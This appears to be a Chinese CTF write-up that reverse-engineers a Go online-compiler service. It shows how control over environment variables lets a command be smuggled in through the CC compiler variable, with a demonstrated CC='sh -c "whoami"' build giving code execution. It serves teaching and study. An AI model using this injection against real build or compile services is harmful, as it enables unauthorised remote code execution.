# It's Mygo!!!\!!🎤🎸🎸🥁🎸 Golang's Funeral 🎹
> Author: 堇姬Naup

發現的一個golang小trick，順便讓各位玩看看golang逆向
## IDA分析
我沒有拔掉debug symbol(因為我發現拔掉好像會太難逆)
以下可以搭配釋出的source code跟golang官方文檔，裡面有該函數原本的樣子，比較容易看懂

golang官方文檔
https://pkg.go.dev/net/http
https://pkg.go.dev/os/exec


先從入口main.main開始看

`net_http__ptr_ServeMux_Handle` 他會設置route的handler
包括 "/mygolang"、"/itsmygo" 和"/"
https://pkg.go.dev/net/http#ServeMux.HandleFunc
ServeMux具體在golang實現會向是這樣
```go
http.HandleFunc("/foo", func(w http.ResponseWriter, r *http.Request) {
  w.Write([]byte("Receive path foo"))
 })
```

ida如下
```c
  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
  v7.data = "/mygolang";
  v9.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
  v9.cap = (int)&pattern;
  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)9, *(string *)&v9.len);
  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
  v7.data = "/itsmygo";
  v9.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
  v9.cap = (int)&off_6C48C8;
  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)8, *(string *)&v9.len);
  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
  v7.data = (void *)"/";
  v9.len = (int)&go_itab_net_http_HandlerFunc_comma_net_http_Handler;
  v9.cap = (int)&off_6C48C0;
  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)buf, *(string *)&v9.len);
```

這東西跟處理filehandler有關係的，他也創建了一個route /static/，並要求他當一個prefix
https://pkg.go.dev/net/http#StripPrefix
```c
  v7.tab = (runtime_itab *)runtime_newobject((runtime__type *)&RTYPE_http_fileHandler);
  v7.tab->inter = (runtime_interfacetype *)&go_itab_net_http_Dir_comma_net_http_FileSystem;
  v7.tab->_type = (runtime__type *)&off_70B6B0;
  v7.data = (void *)8;
  v1 = &go_itab__ptr_net_http_fileHandler_comma_net_http_Handler;
  v9.len = (int)v7.tab;
  v7.tab = (runtime_itab *)"/static/";
  net_http_StripPrefix(v7, *(net_http_Handler *)&v9.len, *(string *)&v9.cap);
  v9.len = (int)v7.tab;
  v9.cap = 8LL;
  v7.tab = (runtime_itab *)net_http_DefaultServeMux;
  v7.data = (void *)"/static/";
  net_http__ptr_ServeMux_Handle(v7, (net_http_ServeMux *)8, *(string *)&v9.len);
```

之後他輸出了一些資訊，輸出東西在v9，v9.array指向off_70B6C0
```c
  a.array = (interface_ *)&RTYPE_string_0;
  a.len = (int)&off_70B6C0;
  v7.data = os_Stdout;
  v7.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
  v9.array = (interface_ *)&a;
  v9.len = 1LL;
  v9.cap = 1LL;
  fmt_Fprintln(v7, v9);
```
off_70B6C0，應該是印出跟開在哪個host 或是 port，等等的資訊
```c
.rodata:000000000070B6C0 off_70B6C0      dq offset aServerStartedO
.rodata:000000000070B6C0                                         ; DATA XREF: main_main+FD↑o
.rodata:000000000070B6C0                                         ; "Server started om port http://localhost"...
```

設定 listen 在哪個 port (unk_6963EC)
```c
  p_http_Server = (http_Server *)runtime_newobject((runtime__type *)&RTYPE_http_Server);
  p_http_Server->Addr.len = 5LL;
  p_http_Server->Addr.ptr = (char *)&unk_6963EC;
  p_http_Server->Handler = v0;
  v3 = net_http__ptr_Server_ListenAndServe(p_http_Server);
```

看到這邊其實差不多了，接下來去分析其他地方，這裡我們直接鎖定重點
main.mygoooHandler
這裡根據網站是處理compiler的頁面
```c
  if ( r->Method.len == 4 && *(_DWORD *)r->Method.str == 'TSOP' )
```
POST會進入到if，否則直接顯示該頁面
以下是complier 透過 POST method處理邏輯
處理跟user request有關，錯誤就印出ERROR
```c
    USERrequest._type = (runtime__type *)&RTYPE__ptr_main_CompileRequest;
    USERrequest.data = _req;
    tab = encoding_json__ptr_Decoder_Decode((encoding_json_Decoder *)p_json_Decoder, USERrequest).tab;
    if ( tab )
    {
      *(_OWORD *)&a.m256_f32[4] = v2;
      *(_QWORD *)a.m256_f32 = &RTYPE_string_0;
      *(_QWORD *)&a.m256_f32[2] = &off_70B680;
      *(_QWORD *)&a.m256_f32[4] = tab->_type;
      *(_QWORD *)&a.m256_f32[6] = &RTYPE__ptr_main_CompileRequest;
      v32.data = os_Stdout;
      v32.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
      v42.array = (interface_ *)&a;
      v42.len = 2LL;
      v42.cap = 2LL;
      fmt_Fprintln(v32, v42);
      v5 = w_8;
      v42.array = (interface_ *)&::w;
      v42.len = 5LL;
      v42.cap = 400LL;
      net_http_Error(code, *(net_http_ResponseWriter *)&v42.array, *(string *)&v42.len);
    }
```

他會去生成Random hash，這是負責生成檔案名稱隨機值
```c
      RandomHash = main_generateRandomHash();
      if ( RandomHash._r1.tab )
      {
        *(_OWORD *)&v26.m256_f32[4] = v2;
        *(_QWORD *)v26.m256_f32 = &RTYPE_string_0;
        *(_QWORD *)&v26.m256_f32[2] = &off_70B680;
        *(_QWORD *)&v26.m256_f32[4] = RandomHash._r1.tab->_type;
        *(_QWORD *)&v26.m256_f32[6] = RandomHash._r1.data;
        v33.data = os_Stdout;
        v33.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
        v43.array = (interface_ *)&v26;
        v43.len = 2LL;
        v43.cap = 2LL;
        fmt_Fprintln(v33, v43);
        v6 = w_8;
        v43.array = (interface_ *)&::w;
        v43.len = 5LL;
        v43.cap = 500LL;
        net_http_Error(code, *(net_http_ResponseWriter *)&v43.array, *(string *)&v43.len);
```
透過實際執行跟ida的內容不難知道./userFile會儲存兩種檔案.json .go
並且檔案名稱會加入上方生成出來的hash值
v36 -> "./userFile"
fmt -> v36("%s/%s_env.json") -> v45是format string的值，往上追指向v28.m256_f32 再往上就會知道是 先前的v36 就是 "./userFile"
第二個format string是 v36.str = name.str; ，而name.str是random值(在v28.m256_f32另一個offset地方)

最後可以組成 ./userFile/<random 值>.json



```c
          *(_OWORD *)v28.m256_f32 = v2;
          *(_OWORD *)&v28.m256_f32[4] = v2;
          v36.str = (uint8 *)"./userFile";
          v36.len = 10LL;
          v36.str = (uint8 *)runtime_convTstring(v36);
          *(_QWORD *)v28.m256_f32 = &RTYPE_string_0;
          *(_QWORD *)&v28.m256_f32[2] = v36.str;
          v36.str = name.str;
          v36.len = (int)&RTYPE__ptr_main_CompileRequest;
          v36.str = (uint8 *)runtime_convTstring(v36);
          *(_QWORD *)&v28.m256_f32[4] = &RTYPE_string_0;
          *(_QWORD *)&v28.m256_f32[6] = v36.str;
          v36.str = (uint8 *)"%s/%s_env.json";
          v36.len = 14LL;
          v45.len = 2LL;
          v45.cap = 2LL;
          v45.array = (interface_ *)&v28;
          name.len = (unsigned __int64)fmt_Sprintf(v36, v45).str;
          v37._type = (runtime__type *)&RTYPE_map_string_string_0;
```

之後用writefile寫東西到該檔案，寫進去的值是req.env
v51 = encoding_json_Marshal(v37); -> v37.data = _req->Env;
看一下前端就是個json
可以存環境變數
```c
          v51._r1.tab = (runtime_itab *)v51._r0.len;
          v51._r1.data = (void *)v51._r0.cap;
          v51._r0.len = 14LL;
          v51._r0.cap = (int)v51._r0.array;
          v51._r0.array = (uint8 *)name.len;
          v9 = os_WriteFile(*(string *)&v51._r0.array, *(_slice_uint8 *)&v51._r0.cap, 0x1A4u);
```

接下來另外一個也一樣，基本上也是先用format string確立要寫的檔案位置
./userFile/<random>.go
追一下他是收req.code相關的
這邊也不難看出是寫入golang程式碼，並存起來
```c
            *(_OWORD *)v28.m256_f32 = v2;
            *(_OWORD *)&v28.m256_f32[4] = v2;
            v39.str = (uint8 *)"./userFile";
            v39.len = 10LL;
            v39.str = (uint8 *)runtime_convTstring(v39);
            *(_QWORD *)v28.m256_f32 = &RTYPE_string_0;
            *(_QWORD *)&v28.m256_f32[2] = v39.str;
            v39.str = name.str;
            v39.len = (int)&RTYPE__ptr_main_CompileRequest;
            v39.str = (uint8 *)runtime_convTstring(v39);
            *(_QWORD *)&v28.m256_f32[4] = &RTYPE_string_0;
            *(_QWORD *)&v28.m256_f32[6] = v39.str;
            v39.str = (uint8 *)"%s/%s.go";
            v39.len = 8LL;
            v47.len = 2LL;
            v47.cap = 2LL;
            v47.array = (interface_ *)&v28;
            v20.str = fmt_Sprintf(v39, v47).str;
            v47.array = (interface_ *)_req->Code.len;
            ptr = _req->Code.ptr;
            v47 = (_slice_interface_)runtime_stringtoslicebyte((runtime_tmpBuf *)buf, *(string *)&v47.array);
            v47.len = v12;
            v47.cap = (int)v47.array;
            v40.len = 8LL;
            v47.array = v13;
            v40.str = v20.str;
            v14 = os_WriteFile(v40, (_slice_uint8)v47, 0x1A4u);
```

之後call main_mygoooHandler_func1
這部分重點就兩個
```c
os_Setenv(*(string *)it.key, *(string *)it.elem);
```
先去讀檔，把env json讀出來
之後他會去設定os env
另外還可以觀察到他設定了timeout(context_WithTimeout)，應該是跟時間設定有關的，這邊如果之後解題有細心觀察應該會發現
	
```c
  v4 = File._r1_2.data;
  File = os_ReadFile(*(string *)(&v4 - 1));
  if ( w.tab )
  {
    *(_OWORD *)&a.m256_f32[4] = v1;
    *(_QWORD *)a.m256_f32 = &RTYPE_string_0;
    *(_QWORD *)&a.m256_f32[2] = &off_70B680;
    v2.tab = (runtime_itab *)w.tab->_type;
    *(context_Context *)&a.m256_f32[4] = v2;
    v59.data = os_Stdout;
    v59.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
    v67.array = (interface_ *)&a;
    v67.len = 2LL;
    v67.cap = 2LL;
    v67 = (_slice_interface_)fmt_Fprintln(v59, v67);
    HIBYTE(File._r0_2.cap) = 0;
    (*v56)(v7, v8, v67.array);
    return;
  }
  v35 = v6;
  v34 = v4;
  data.array = v5;
  data.len = (int)runtime_newobject((runtime__type *)&RTYPE_map_string_string_0);
  v9 = v35;
  v58._type = (runtime__type *)&RTYPE__ptr_map_string_string;
  v58.data = (void *)data.len;
  array = data.array;
  v11 = encoding_json_Unmarshal(*(_slice_uint8 *)(&v4 - 1), v58);
  if ( v11.tab )
  {
    *(_OWORD *)&v47.m256_f32[4] = v1;
    *(_QWORD *)v47.m256_f32 = &RTYPE_string_0;
    *(_QWORD *)&v47.m256_f32[2] = &off_70B680;
    *(_QWORD *)&v47.m256_f32[4] = v11.tab->_type;
    *(_QWORD *)&v47.m256_f32[6] = v11.data;
    v60.data = os_Stdout;
    v60.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;
    v68.array = (interface_ *)&v47;
    v68.len = 2LL;
    v68.cap = 2LL;
    v68 = (_slice_interface_)fmt_Fprintln(v60, v68);
    HIBYTE(File._r0_2.cap) = 0;
    (*v56)(v13, v14, v68.array);
    return;
  }
  v12 = *(runtime_hmap **)data.len;
  v31 = &v57;
  ((void (__fastcall *)(char *))loc_46462B)((char *)&File + 368);
  runtime_mapiterinit((runtime_maptype *)&RTYPE_map_string_string_0, v12, &it);
  while ( it.key )
  {
    os_Setenv(*(string *)it.key, *(string *)it.elem);
    runtime_mapiternext(&it);
  }	
```
	
之後他會去執行到 os_exec_Command
並且上方也有設定 ./userEXE/random
用來存儲使用者編譯的執行檔
他會去執行
byte_69601B -> go(0x67 0x6f)
unk_6964C3 -> build (0x62 0x75 0x69 0x6C 0x64)
unk_695F87 -> -o (0x2d 0x6f)
也就是編譯一個檔案
```c
  *(_OWORD *)&v43.array = v1;
  v61.str = (uint8 *)w.data;
  v61.len = (int)File._r1.data;
  v61.str = (uint8 *)runtime_convTstring(v61);
  v43.array = (interface_ *)&RTYPE_string_0;
  v43.len = (int)v61.str;
  v61.str = (uint8 *)"./userEXE/%s";
  v61.len = 12LL;
  v69.len = 1LL;
  v69.cap = 1LL;
  v69.array = (interface_ *)&v43;
  v15 = fmt_Sprintf(v61, v69).str;
  arg.array = (string *)&unk_6964C3;
  arg.len = 5LL;
  arg.cap = (int)&unk_695F87;
  v50 = 2LL;
  v51 = v15;
  v52 = 12LL;
  v53 = v39;
  v54 = v33;
  if ( v40 )
  {
    v62.str = (uint8 *)&byte_69601B;
    v62.len = 2LL;
    p_arg = &arg;
    p_data = 4LL;
    v18 = 4LL;
    v19 = (exec_Cmd *)os_exec_Command(v62, *(_slice_string *)(&p_data - 1));
    v19->ctx.tab = v40;
    if ( *(_DWORD *)&runtime_writeBarrier.enabled )
    {
      p_data = (__int64)&v19->ctx.data;
      runtime_gcWriteBarrierCX();
    }
```

逆向到這裡其實差不多了，簡單梳理流程就是
送出 POST -> 將 request 的 env跟code存起來到檔案
執行os setenv去更改環境變數(根據剛剛存的檔案也就是你輸入的環境變數)
最後build你送進去的檔案
這題就是任意控env跟code他會幫你編譯卻不會執行的題目


## 如何攻擊
這題目標要 RCE
這邊可以先看看golang會有哪些環境變數
輸入go env可以知道
	
```conf
GO111MODULE=""
GOARCH="amd64"
GOBIN=""
GOCACHE="/home/naup/.cache/go-build"
GOENV="/home/naup/.config/go/env"
GOEXE=""
GOEXPERIMENT=""
GOFLAGS=""
GOHOSTARCH="amd64"
GOHOSTOS="linux"
GOINSECURE=""
GOMODCACHE="/home/naup/go/pkg/mod"
GONOPROXY=""
GONOSUMDB=""
GOOS="linux"
GOPATH="/home/naup/go"
GOPRIVATE=""
GOPROXY="https://proxy.golang.org,direct"
GOROOT="/usr/lib/go-1.18"
GOSUMDB="sum.golang.org"
GOTMPDIR=""
GOTOOLDIR="/usr/lib/go-1.18/pkg/tool/linux_amd64"
GOVCS=""
GOVERSION="go1.18.1"
GCCGO="gccgo"
GOAMD64="v1"
AR="ar"
CC="gcc"
CXX="g++"
CGO_ENABLED="1"
GOMOD="/dev/null"
GOWORK=""
CGO_CFLAGS="-g -O2"
CGO_CPPFLAGS=""
CGO_CXXFLAGS="-g -O2"
CGO_FFLAGS="-g -O2"
CGO_LDFLAGS="-g -O2"
PKG_CONFIG="pkg-config"
GOGCCFLAGS="-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build2579239834=/tmp/go-build -gno-record-gcc-switches"
```

順便觀察一下golang在編譯時候的行為，我們去編譯這個
```go
package main
import "fmt"
func main() {
    fmt.Println("MyGo!!!!!")
}
```
	
```cmd
naup@naup-virtual-machine:~/Desktop/dist$ go build -x m.go 
WORK=/tmp/go-build980806300
mkdir -p $WORK/b001/
cat >$WORK/b001/importcfg << 'EOF' # internal
# import config
packagefile fmt=/usr/lib/go-1.18/pkg/linux_amd64/fmt.a
packagefile runtime=/usr/lib/go-1.18/pkg/linux_amd64/runtime.a
EOF
cd /home/naup/Desktop/dist
/usr/lib/go-1.18/pkg/tool/linux_amd64/compile -o $WORK/b001/_pkg_.a -trimpath "$WORK/b001=>" -p main -complete -buildid Vsh2hLhWiJJICn-H5QGb/Vsh2hLhWiJJICn-H5QGb -goversion go1.18.1 -c=2 -nolocalimports -importcfg $WORK/b001/importcfg -pack ./m.go
/usr/lib/go-1.18/pkg/tool/linux_amd64/buildid -w $WORK/b001/_pkg_.a # internal
cp $WORK/b001/_pkg_.a /home/naup/.cache/go-build/fe/fefe6b756cb52c2f43dcdf36df7185b972deafe8f4a6b45e8cd854903efd7c8d-d # internal
cat >$WORK/b001/importcfg.link << 'EOF' # internal
packagefile command-line-arguments=$WORK/b001/_pkg_.a
packagefile fmt=/usr/lib/go-1.18/pkg/linux_amd64/fmt.a
packagefile runtime=/usr/lib/go-1.18/pkg/linux_amd64/runtime.a
packagefile errors=/usr/lib/go-1.18/pkg/linux_amd64/errors.a
packagefile internal/fmtsort=/usr/lib/go-1.18/pkg/linux_amd64/internal/fmtsort.a
packagefile io=/usr/lib/go-1.18/pkg/linux_amd64/io.a
packagefile math=/usr/lib/go-1.18/pkg/linux_amd64/math.a
packagefile os=/usr/lib/go-1.18/pkg/linux_amd64/os.a
packagefile reflect=/usr/lib/go-1.18/pkg/linux_amd64/reflect.a
packagefile strconv=/usr/lib/go-1.18/pkg/linux_amd64/strconv.a
packagefile sync=/usr/lib/go-1.18/pkg/linux_amd64/sync.a
packagefile unicode/utf8=/usr/lib/go-1.18/pkg/linux_amd64/unicode/utf8.a
packagefile internal/abi=/usr/lib/go-1.18/pkg/linux_amd64/internal/abi.a
packagefile internal/bytealg=/usr/lib/go-1.18/pkg/linux_amd64/internal/bytealg.a
packagefile internal/cpu=/usr/lib/go-1.18/pkg/linux_amd64/internal/cpu.a
packagefile internal/goarch=/usr/lib/go-1.18/pkg/linux_amd64/internal/goarch.a
packagefile internal/goexperiment=/usr/lib/go-1.18/pkg/linux_amd64/internal/goexperiment.a
packagefile internal/goos=/usr/lib/go-1.18/pkg/linux_amd64/internal/goos.a
packagefile runtime/internal/atomic=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/atomic.a
packagefile runtime/internal/math=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/math.a
packagefile runtime/internal/sys=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/sys.a
packagefile runtime/internal/syscall=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/syscall.a
packagefile internal/reflectlite=/usr/lib/go-1.18/pkg/linux_amd64/internal/reflectlite.a
packagefile sort=/usr/lib/go-1.18/pkg/linux_amd64/sort.a
packagefile math/bits=/usr/lib/go-1.18/pkg/linux_amd64/math/bits.a
packagefile internal/itoa=/usr/lib/go-1.18/pkg/linux_amd64/internal/itoa.a
packagefile internal/oserror=/usr/lib/go-1.18/pkg/linux_amd64/internal/oserror.a
packagefile internal/poll=/usr/lib/go-1.18/pkg/linux_amd64/internal/poll.a
packagefile internal/syscall/execenv=/usr/lib/go-1.18/pkg/linux_amd64/internal/syscall/execenv.a
packagefile internal/syscall/unix=/usr/lib/go-1.18/pkg/linux_amd64/internal/syscall/unix.a
packagefile internal/testlog=/usr/lib/go-1.18/pkg/linux_amd64/internal/testlog.a
packagefile internal/unsafeheader=/usr/lib/go-1.18/pkg/linux_amd64/internal/unsafeheader.a
packagefile io/fs=/usr/lib/go-1.18/pkg/linux_amd64/io/fs.a
packagefile sync/atomic=/usr/lib/go-1.18/pkg/linux_amd64/sync/atomic.a
packagefile syscall=/usr/lib/go-1.18/pkg/linux_amd64/syscall.a
packagefile time=/usr/lib/go-1.18/pkg/linux_amd64/time.a
packagefile unicode=/usr/lib/go-1.18/pkg/linux_amd64/unicode.a
packagefile internal/race=/usr/lib/go-1.18/pkg/linux_amd64/internal/race.a
packagefile path=/usr/lib/go-1.18/pkg/linux_amd64/path.a
modinfo "0w\xaf\f\x92t\b\x02A\xe1\xc1\a\xe6\xd6\x18\xe6path\tcommand-line-arguments\nbuild\t-compiler=gc\nbuild\tCGO_ENABLED=1\nbuild\tCGO_CFLAGS=\nbuild\tCGO_CPPFLAGS=\nbuild\tCGO_CXXFLAGS=\nbuild\tCGO_LDFLAGS=\nbuild\tGOARCH=amd64\nbuild\tGOOS=linux\nbuild\tGOAMD64=v1\n\xf92C1\x86\x18 r\x00\x82B\x10A\x16\xd8\xf2"
EOF
mkdir -p $WORK/b001/exe/
cd .
/usr/lib/go-1.18/pkg/tool/linux_amd64/link -o $WORK/b001/exe/a.out -importcfg $WORK/b001/importcfg.link -buildmode=exe -buildid=OckkTGN8spR__1zW-PIY/Vsh2hLhWiJJICn-H5QGb/TP-nY9XUtgFY4fz87Avq/OckkTGN8spR__1zW-PIY -extld=gcc $WORK/b001/_pkg_.a
/usr/lib/go-1.18/pkg/tool/linux_amd64/buildid -w $WORK/b001/exe/a.out # internal
mv $WORK/b001/exe/a.out m
rm -r $WORK/b001/	
```
	
單純看下來其實控環境變數對於golang編譯的行為其實不大，大部分是設定路徑跟使用package之類的行為
這題還讓你們控編譯的code那當然就沒那麼單純只是修改環境變數就可以RCE了

如果你認真觀察golang的環境變數會發現，他有跟gcc相關的環境變數，但卻沒有用到gcc

![gooo](img/aaa.jpg)


在 golang 中撰寫函式庫時，通常這些函式庫只能供 golang 使用。這是因為 golang 在提供跨語言支援上並不如一些其他語言靈活，相比之下，C、C++ 或是 Rust 等語言提供了更好的選擇，因為它們在性能、跨語言互操作性上表現更佳。

除此之外，許多現有的 C 或 C++ 函式庫已經被使用多年，並且運行穩定，沒有理由僅僅因為想轉換到 golang 而將這些函式庫重新實作。因此，最合理的方式是讓 golang 直接利用這些現有的 C 或 C++ 程式碼，而不是重寫


golang官方就開發了cgo
https://pkg.go.dev/cmd/cgo
仔細想想，要使用cgo一定要有C / C++ 編譯器之類的
而 CC 這個環境變量的 g++ 就是指定了編譯器，並去使用他
	
	
```go
package main
import (
    "C"
    "fmt"
)
func main() {
    fmt.Println("hello world")
}
```
我們去 import C
再來看看編譯行為
```cmd
naup@naup-virtual-machine:~/Desktop/dist$ go build -x m.go 
WORK=/tmp/go-build2958605316
mkdir -p $WORK/b001/
cd /home/naup/Desktop/dist
TERM='dumb' CGO_LDFLAGS='"-g" "-O2"' /usr/lib/go-1.18/pkg/tool/linux_amd64/cgo -objdir $WORK/b001/ -importpath command-line-arguments -- -I $WORK/b001/ -g -O2 ./m.go
cd $WORK
gcc -fno-caret-diagnostics -c -x c - -o /dev/null || true
gcc -Qunused-arguments -c -x c - -o /dev/null || true
gcc -fdebug-prefix-map=a=b -c -x c - -o /dev/null || true
gcc -gno-record-gcc-switches -c -x c - -o /dev/null || true
cd $WORK/b001
TERM='dumb' gcc -I /home/naup/Desktop/dist -fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=$WORK/b001=/tmp/go-build -gno-record-gcc-switches -I ./ -g -O2 -o ./_x001.o -c _cgo_export.c
TERM='dumb' gcc -I /home/naup/Desktop/dist -fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=$WORK/b001=/tmp/go-build -gno-record-gcc-switches -I ./ -g -O2 -o ./_x002.o -c m.cgo2.c
TERM='dumb' gcc -I /home/naup/Desktop/dist -fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=$WORK/b001=/tmp/go-build -gno-record-gcc-switches -I ./ -g -O2 -o ./_cgo_main.o -c _cgo_main.c
cd /home/naup/Desktop/dist
TERM='dumb' gcc -I . -fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=$WORK/b001=/tmp/go-build -gno-record-gcc-switches -o $WORK/b001/_cgo_.o $WORK/b001/_cgo_main.o $WORK/b001/_x001.o $WORK/b001/_x002.o -g -O2
TERM='dumb' /usr/lib/go-1.18/pkg/tool/linux_amd64/cgo -dynpackage main -dynimport $WORK/b001/_cgo_.o -dynout $WORK/b001/_cgo_import.go
cat >$WORK/b001/importcfg << 'EOF' # internal
# import config
packagefile fmt=/usr/lib/go-1.18/pkg/linux_amd64/fmt.a
packagefile runtime/cgo=/usr/lib/go-1.18/pkg/linux_amd64/runtime/cgo.a
packagefile syscall=/usr/lib/go-1.18/pkg/linux_amd64/syscall.a
packagefile runtime=/usr/lib/go-1.18/pkg/linux_amd64/runtime.a
EOF
/usr/lib/go-1.18/pkg/tool/linux_amd64/compile -o $WORK/b001/_pkg_.a -trimpath "$WORK/b001=>" -p main -buildid 4yhnu8TZ7l1bcN-natjy/4yhnu8TZ7l1bcN-natjy -goversion go1.18.1 -c=2 -nolocalimports -importcfg $WORK/b001/importcfg -pack $WORK/b001/_cgo_gotypes.go $WORK/b001/m.cgo1.go $WORK/b001/_cgo_import.go
/usr/lib/go-1.18/pkg/tool/linux_amd64/pack r $WORK/b001/_pkg_.a $WORK/b001/_x001.o $WORK/b001/_x002.o # internal
/usr/lib/go-1.18/pkg/tool/linux_amd64/buildid -w $WORK/b001/_pkg_.a # internal
cp $WORK/b001/_pkg_.a /home/naup/.cache/go-build/b2/b23cd0a7318c2e4d4a0620fde83a19729de3706a3845412442e0b6a8eebdd9d5-d # internal
cat >$WORK/b001/importcfg.link << 'EOF' # internal
packagefile command-line-arguments=$WORK/b001/_pkg_.a
packagefile fmt=/usr/lib/go-1.18/pkg/linux_amd64/fmt.a
packagefile runtime/cgo=/usr/lib/go-1.18/pkg/linux_amd64/runtime/cgo.a
packagefile syscall=/usr/lib/go-1.18/pkg/linux_amd64/syscall.a
packagefile runtime=/usr/lib/go-1.18/pkg/linux_amd64/runtime.a
packagefile errors=/usr/lib/go-1.18/pkg/linux_amd64/errors.a
packagefile internal/fmtsort=/usr/lib/go-1.18/pkg/linux_amd64/internal/fmtsort.a
packagefile io=/usr/lib/go-1.18/pkg/linux_amd64/io.a
packagefile math=/usr/lib/go-1.18/pkg/linux_amd64/math.a
packagefile os=/usr/lib/go-1.18/pkg/linux_amd64/os.a
packagefile reflect=/usr/lib/go-1.18/pkg/linux_amd64/reflect.a
packagefile strconv=/usr/lib/go-1.18/pkg/linux_amd64/strconv.a
packagefile sync=/usr/lib/go-1.18/pkg/linux_amd64/sync.a
packagefile unicode/utf8=/usr/lib/go-1.18/pkg/linux_amd64/unicode/utf8.a
packagefile sync/atomic=/usr/lib/go-1.18/pkg/linux_amd64/sync/atomic.a
packagefile internal/bytealg=/usr/lib/go-1.18/pkg/linux_amd64/internal/bytealg.a
packagefile internal/itoa=/usr/lib/go-1.18/pkg/linux_amd64/internal/itoa.a
packagefile internal/oserror=/usr/lib/go-1.18/pkg/linux_amd64/internal/oserror.a
packagefile internal/race=/usr/lib/go-1.18/pkg/linux_amd64/internal/race.a
packagefile internal/unsafeheader=/usr/lib/go-1.18/pkg/linux_amd64/internal/unsafeheader.a
packagefile internal/abi=/usr/lib/go-1.18/pkg/linux_amd64/internal/abi.a
packagefile internal/cpu=/usr/lib/go-1.18/pkg/linux_amd64/internal/cpu.a
packagefile internal/goarch=/usr/lib/go-1.18/pkg/linux_amd64/internal/goarch.a
packagefile internal/goexperiment=/usr/lib/go-1.18/pkg/linux_amd64/internal/goexperiment.a
packagefile internal/goos=/usr/lib/go-1.18/pkg/linux_amd64/internal/goos.a
packagefile runtime/internal/atomic=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/atomic.a
packagefile runtime/internal/math=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/math.a
packagefile runtime/internal/sys=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/sys.a
packagefile runtime/internal/syscall=/usr/lib/go-1.18/pkg/linux_amd64/runtime/internal/syscall.a
packagefile internal/reflectlite=/usr/lib/go-1.18/pkg/linux_amd64/internal/reflectlite.a
packagefile sort=/usr/lib/go-1.18/pkg/linux_amd64/sort.a
packagefile math/bits=/usr/lib/go-1.18/pkg/linux_amd64/math/bits.a
packagefile internal/poll=/usr/lib/go-1.18/pkg/linux_amd64/internal/poll.a
packagefile internal/syscall/execenv=/usr/lib/go-1.18/pkg/linux_amd64/internal/syscall/execenv.a
packagefile internal/syscall/unix=/usr/lib/go-1.18/pkg/linux_amd64/internal/syscall/unix.a
packagefile internal/testlog=/usr/lib/go-1.18/pkg/linux_amd64/internal/testlog.a
packagefile io/fs=/usr/lib/go-1.18/pkg/linux_amd64/io/fs.a
packagefile time=/usr/lib/go-1.18/pkg/linux_amd64/time.a
packagefile unicode=/usr/lib/go-1.18/pkg/linux_amd64/unicode.a
packagefile path=/usr/lib/go-1.18/pkg/linux_amd64/path.a
modinfo "0w\xaf\f\x92t\b\x02A\xe1\xc1\a\xe6\xd6\x18\xe6path\tcommand-line-arguments\nbuild\t-compiler=gc\nbuild\tCGO_ENABLED=1\nbuild\tCGO_CFLAGS=\nbuild\tCGO_CPPFLAGS=\nbuild\tCGO_CXXFLAGS=\nbuild\tCGO_LDFLAGS=\nbuild\tGOARCH=amd64\nbuild\tGOOS=linux\nbuild\tGOAMD64=v1\n\xf92C1\x86\x18 r\x00\x82B\x10A\x16\xd8\xf2"
EOF
mkdir -p $WORK/b001/exe/
cd .
/usr/lib/go-1.18/pkg/tool/linux_amd64/link -o $WORK/b001/exe/a.out -importcfg $WORK/b001/importcfg.link -buildmode=exe -buildid=qsz7grbrD5uSgvJOHsxo/4yhnu8TZ7l1bcN-natjy/93DODu0O1nJlOV7JWxS8/qsz7grbrD5uSgvJOHsxo -extld=gcc $WORK/b001/_pkg_.a
/usr/lib/go-1.18/pkg/tool/linux_amd64/buildid -w $WORK/b001/exe/a.out # internal
mv $WORK/b001/exe/a.out m
rm -r $WORK/b001/
```
他確實執行了gcc
那如果我們試著去修改CC這個env
再去執行
```
naup@naup-virtual-machine:~/Desktop/dist$ CC='MyGo!!!!!' go build -x m.go 
WORK=/tmp/go-build1547451115
mkdir -p $WORK/b041/
cd /usr/lib/go-1.18/src/runtime/cgo
TERM='dumb' CGO_LDFLAGS='"-g" "-O2" "-lpthread"' /usr/lib/go-1.18/pkg/tool/linux_amd64/cgo -objdir $WORK/b041/ -importpath runtime/cgo -import_runtime_cgo=false -import_syscall=false -- -I $WORK/b041/ -g -O2 -Wall -Werror ./cgo.go
# runtime/cgo
cgo: C compiler "MyGo!!!!!" not found: exec: "MyGo!!!!!": executable file not found in $PATH	
```
他好像執行到了 MyGo!!!!!
我們改成 sh -c 'whoami'
	
```
naup@naup-virtual-machine:~/Desktop/dist$ CC='sh -c "whoami"' go build -x m.go 
WORK=/tmp/go-build4222736549
mkdir -p $WORK/b041/
cd /usr/lib/go-1.18/src/runtime/cgo
TERM='dumb' CGO_LDFLAGS='"-g" "-O2" "-lpthread"' /usr/lib/go-1.18/pkg/tool/linux_amd64/cgo -objdir $WORK/b041/ -importpath runtime/cgo -import_runtime_cgo=false -import_syscall=false -- -I $WORK/b041/ -g -O2 -Wall -Werror ./cgo.go
cd $WORK
sh -c whoami -fno-caret-diagnostics -c -x c - -o /dev/null || true
sh -c whoami -Qunused-arguments -c -x c - -o /dev/null || true
